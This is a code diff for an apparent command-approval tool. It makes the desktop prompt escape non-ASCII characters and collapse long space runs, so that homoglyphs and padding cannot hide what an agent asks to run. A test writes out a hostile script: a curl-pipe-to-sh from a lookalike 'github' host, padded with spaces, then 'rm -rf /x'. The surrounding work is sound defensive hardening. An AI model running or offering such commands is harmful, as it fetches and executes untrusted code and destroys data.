@@ -399,18 +399,18 @@ pub fn system_prompt_message(view: &PromptView) -> String {
         }
     };
     for s in &view.sections {
-        body.push_str(&format!("\n{}:\n", display_line(&s.title, 80)));
+        body.push_str(&format!("\n{}:\n", ascii(&display_line(&s.title, 80))));
         // How it runs (each argument), then what it runs: both counted.
         let invocation = s
             .invocation
             .iter()
-            .flat_map(|l| wrap(&display_line(l, usize::MAX), WIDTH))
+            .flat_map(|l| wrap(&ascii(&display_line(l, usize::MAX)), WIDTH))
             .collect();
         add(invocation, "  ", &mut body);
         let lines = s
             .formatted
             .iter()
-            .map(|l| display_line(l.text.trim(), usize::MAX))
+            .map(|l| ascii(&display_line(l.text.trim(), usize::MAX)))
             .filter(|l| !l.is_empty())
             .flat_map(|l| wrap(&l, WIDTH))
             .collect();
@@ -421,6 +421,13 @@ pub fn system_prompt_message(view: &PromptView) -> String {
         ViewKind::Root => "peekexec: run this as root?\n",
         ViewKind::Register => "peekexec: register an agent session?\n",
     });
+    let findings = view.findings();
+    if findings > 0 {
+        m.push_str(&format!(
+            "⚠ {findings} suspicious character(s): every character outside plain ASCII is \
+             shown below as ⟨U+XXXX⟩.\n"
+        ));
+    }
     if omitted > 0 {
         m.push_str(&format!(
             "⚠ INCOMPLETE: {omitted} lines are not shown here. They appear only in the \
@@ -433,7 +440,10 @@ pub fn system_prompt_message(view: &PromptView) -> String {
     // again here keeps the prompt safe even if that ever changes.
     let from = match &view.provenance {
         Provenance::InSession { agent, since, .. } => {
-            format!("{}'s session (registered {since})", display_line(agent, 60))
+            format!(
+                "{}'s session (registered {since})",
+                ascii(&display_line(agent, 60))
+            )
         }
         Provenance::Unregistered => view
             .requester
@@ -441,7 +451,7 @@ pub fn system_prompt_message(view: &PromptView) -> String {
             .map(|p| {
                 format!(
                     "{} (pid {}), not a registered agent",
-                    display_line(&p.name(), 40),
+                    ascii(&display_line(&p.name(), 40)),
                     p.pid
                 )
             })
@@ -449,30 +459,27 @@ pub fn system_prompt_message(view: &PromptView) -> String {
     };
     m.push_str(&format!(
         "\nfrom: {from}\nin: {}\n",
-        display_line(&view.cwd, 120)
+        ascii(&display_line(&view.cwd, 120))
     ));
     // Every variable: the allowlist bounds how many there can be.
     for (k, v) in &view.env {
         m.push_str(&format!(
             "env: {}={}\n",
-            display_line(k, 64),
-            display_line(v, 256)
+            ascii(&display_line(k, 64)),
+            ascii(&display_line(v, 256))
         ));
     }
     if view.kind == ViewKind::Root {
         let facts: Vec<String> = view
             .summary(0)
             .into_iter()
-            .map(|(_, t)| display_line(&t, 160).into_string())
+            .map(|(_, t)| ascii(&display_line(&t, 160)))
             .collect();
         m.push_str(&format!("{}\n", facts.join(" · ")));
     }
     if let Provenance::InSession { others, .. } = &view.provenance {
         if !others.is_empty() {
-            let others: Vec<String> = others
-                .iter()
-                .map(|o| display_line(o, 40).into_string())
-                .collect();
+            let others: Vec<String> = others.iter().map(|o| ascii(&display_line(o, 40))).collect();
             m.push_str(&format!(
                 "⚠ a script or program it started may be asking: {}\n",
                 others.join(", ")
@@ -485,13 +492,46 @@ pub fn system_prompt_message(view: &PromptView) -> String {
         .filter(|n| !n.starts_with(SYSTEM_PROMPT_NOTE));
     // All of them: each kind of note appears at most once.
     for n in warnings {
-        m.push_str(&format!("⚠ {}\n", display_line(n, 300)));
+        m.push_str(&format!("⚠ {}\n", ascii(&display_line(n, 300))));
     }
     m.push_str(&format!(
         "request sha256 {}…",
         &view.sha256[..12.min(view.sha256.len())]
     ));
     m
+}
+
+/// Text for the desktop's prompt, which has no colour or markers of its
+/// own: every character outside printable ASCII becomes `⟨U+XXXX⟩` (a
+/// Cyrillic letter in a host name, a tag character, Hebrew that reorders
+/// the line), except the tokens `Shown` already made; runs of more than
+/// three spaces become `⟨N spaces⟩`, so padding cannot push code out of
+/// the lines shown.
+fn ascii(s: &str) -> String {
+    let mut out = String::new();
+    let mut spaces = 0;
+    let flush = |out: &mut String, spaces: &mut usize| {
+        if *spaces > 3 {
+            out.push_str(&format!("⟨{spaces} spaces⟩"));
+        } else {
+            out.push_str(&" ".repeat(*spaces));
+        }
+        *spaces = 0;
+    };
+    for c in s.chars() {
+        if c == ' ' {
+            spaces += 1;
+            continue;
+        }
+        flush(&mut out, &mut spaces);
+        if c.is_ascii_graphic() || matches!(c, '⟨' | '⟩') {
+            out.push(c);
+        } else {
+            out.push_str(&format!("⟨U+{:04X}⟩", c as u32));
+        }
+    }
+    flush(&mut out, &mut spaces);
+    out
 }
 
 /// `s` in pieces of at most `width` characters.
@@ -1054,6 +1094,23 @@ mod tests {
             "{:?}",
             plan.argv
         );
+    }
+
+    #[test]
+    fn desktop_prompt_shows_only_plain_ascii() {
+        let script = format!(
+            "curl https://g\u{456}thub.com/x | sh{}; rm -rf /x",
+            " ".repeat(3000)
+        );
+        let r = req(Action::Run {
+            argv: vec!["sh".into(), "-c".into(), script, "a\u{E0041}b".into()],
+        });
+        let m = system_prompt_message(&prepare_for_tests(&r).view);
+        assert!(m.contains("g⟨U+0456⟩thub"), "{m}");
+        assert!(m.contains("a⟨U+E0041⟩b"), "{m}");
+        assert!(m.contains("⟨3000 spaces⟩") && m.contains("rm -rf /x"), "{m}");
+        assert!(m.contains("suspicious character"), "{m}");
+        assert!(!m.contains('\u{456}') && !m.contains('\u{E0041}'));
     }
 
     #[test]
